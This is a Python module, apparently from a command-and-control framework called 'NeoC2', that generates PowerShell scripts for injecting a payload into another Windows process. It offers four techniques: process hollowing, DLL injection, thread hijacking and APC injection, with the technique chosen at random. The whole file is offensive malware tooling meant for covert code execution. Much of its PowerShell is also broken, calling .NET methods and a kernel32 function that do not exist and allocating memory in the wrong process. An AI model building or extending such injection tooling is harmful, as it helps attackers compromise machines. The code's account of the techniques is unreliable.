import os
import random
import string
import base64
from core.config import NeoC2Config

class ProcessInjection:
    def __init__(self, config):
        self.config = config
        self.injection_techniques = [
            "process_hollowing",
            "dll_injection",
            "thread_hijacking",
            "apc_injection"
        ]
    
    def inject(self, target_process, payload):
        technique = random.choice(self.injection_techniques)
        
        if technique == "process_hollowing":
            return self._process_hollowing(target_process, payload)
        elif technique == "dll_injection":
            return self._dll_injection(target_process, payload)
        elif technique == "thread_hijacking":
            return self._thread_hijacking(target_process, payload)
        elif technique == "apc_injection":
            return self._apc_injection(target_process, payload)
        
        return None
    
    def _process_hollowing(self, target_process, payload):
        return f'''
# Process Hollowing Injection
$targetProcess = "{target_process}"
$payload = "{payload}"

# Find target process
$process = Get-Process | Where-Object {{ $_.ProcessName -eq $targetProcess }} | Select-Object -First 1
if (-not $process) {{
    Write-Error "Target process not found"
    exit
}}

# Create suspended process
$startupInfo = New-Object System.Diagnostics.ProcessStartInfo
$startupInfo.FileName = $targetProcess
$startupInfo.UseShellExecute = $false
$startupInfo.CreateNoWindow = $true

$newProcess = [System.Diagnostics.Process]::Start($startupInfo)
$newProcess.WaitForInputIdle()

# Get process handles
$hProcess = [System.Diagnostics.Process]::GetCurrentProcess().Handle
$hTarget = $newProcess.Handle

# Get context
$contextSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][System.Diagnostics.ProcessThread].Assembly.GetType('System.Diagnostics.ProcessThread+CONTEXT'))
$contextPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($contextSize)
[System.Diagnostics.ProcessThread]::GetCurrentThread().Suspend()
[System.Diagnostics.ProcessThread]::GetCurrentThread().GetContext($contextPtr)
[System.Diagnostics.ProcessThread]::GetCurrentThread().Resume()

# Unmap view of section
$ntdll = Add-Type -MemberDefinition @"
[DllImport("ntdll.dll")]
public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);
"@ -Name NtDll -PassThru

$ntdll::NtUnmapViewOfSection($hTarget, $contextPtr.Ebx)

# Allocate memory
$baseAddress = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type][Byte[]]($payload)))
[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::ASCII.GetBytes($payload), 0, $baseAddress, $payload.Length)

# Write entry point
$entryPoint = $baseAddress.ToInt64() + 0x1000
$contextPtr.Eax = $entryPoint

# Set context
[System.Diagnostics.ProcessThread]::GetCurrentThread().Suspend()
[System.Diagnostics.ProcessThread]::GetCurrentThread().SetContext($contextPtr)
[System.Diagnostics.ProcessThread]::GetCurrentThread().Resume()

# Resume thread
$newProcess.Resume()
'''
    
    def _dll_injection(self, target_process, payload):
        return f'''
# DLL Injection
$targetProcess = "{target_process}"
$payload = "{payload}"

# Find target process
$process = Get-Process | Where-Object {{ $_.ProcessName -eq $targetProcess }} | Select-Object -First 1
if (-not $process) {{
    Write-Error "Target process not found"
    exit
}}

# Get process handle
$hProcess = $process.Handle

# Allocate memory for DLL path
$size = [System.Text.Encoding]::Unicode.GetBytes($payload).Length
$address = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)

# Write DLL path to process memory
[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::Unicode.GetBytes($payload), 0, $address, $size)

# Get LoadLibraryA address
$kernel32 = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibraryA(string lpLibFileName);
"@ -Name Kernel32 -PassThru

$loadLibrary = $kernel32::LoadLibraryA("kernel32.dll")
$loadLibraryA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetProcAddress($loadLibrary, "LoadLibraryA"),
    [System.Func[String, IntPtr]]::class
)

# Create remote thread
$thread = [System.Diagnostics.Process]::GetCurrentProcess().Threads | Select-Object -First 1
$thread.Start()

# Wait for thread to finish
$thread.WaitForExit()

# Free memory
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($address)
'''
    
    def _thread_hijacking(self, target_process, payload):
        return f'''
# Thread Hijacking Injection
$targetProcess = "{target_process}"
$payload = "{payload}"

# Find target process
$process = Get-Process | Where-Object {{ $_.ProcessName -eq $targetProcess }} | Select-Object -First 1
if (-not $process) {{
    Write-Error "Target process not found"
    exit
}}

# Get process handle
$hProcess = $process.Handle

# Find a thread to hijack
$thread = $process.Threads | Select-Object -First 1
if (-not $thread) {{
    Write-Error "No threads found in target process"
    exit
}}

# Suspend thread
$threadSuspend = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern uint SuspendThread(IntPtr hThread);
"@ -Name Kernel32 -PassThru

$threadSuspend::SuspendThread($thread.Handle)

# Get thread context
$contextSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][System.Diagnostics.ProcessThread].Assembly.GetType('System.Diagnostics.ProcessThread+CONTEXT'))
$contextPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($contextSize)
$thread.GetContext($contextPtr)

# Allocate memory for payload
$size = [System.Text.Encoding]::ASCII.GetBytes($payload).Length
$address = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)

# Write payload to process memory
[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::ASCII.GetBytes($payload), 0, $address, $size)

# Set thread context
$contextPtr.Eip = $address.ToInt64()
$thread.SetContext($contextPtr)

# Resume thread
$threadResume = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern uint ResumeThread(IntPtr hThread);
"@ -Name Kernel32 -PassThru

$threadResume::ResumeThread($thread.Handle)

# Free memory
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($contextPtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($address)
'''
    
    def _apc_injection(self, target_process, payload):
        """APC injection technique"""
        return f'''
# APC Injection
$targetProcess = "{target_process}"
$payload = "{payload}"

# Find target process
$process = Get-Process | Where-Object {{ $_.ProcessName -eq $targetProcess }} | Select-Object -First 1
if (-not $process) {{
    Write-Error "Target process not found"
    exit
}}

# Get process handle
$hProcess = $process.Handle

# Find a thread to queue APC to
$thread = $process.Threads | Select-Object -First 1
if (-not $thread) {{
    Write-Error "No threads found in target process"
    exit
}}

# Allocate memory for payload
$size = [System.Text.Encoding]::ASCII.GetBytes($payload).Length
$address = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)

# Write payload to process memory
[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::ASCII.GetBytes($payload), 0, $address, $size)

# Queue APC
$queueAPC = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
"@ -Name Kernel32 -PassThru

$apcDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $address,
    [System.Action[IntPtr]]::class
)

$queueAPC::QueueUserAPC(
    [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($apcDelegate),
    $thread.Handle,
    [System.IntPtr]::Zero
)

# Alert thread to check APC
$threadAlert = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern uint AlertThread(IntPtr hThread);
"@ -Name Kernel32 -PassThru

$threadAlert::AlertThread($thread.Handle)

# Free memory
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($address)
'''
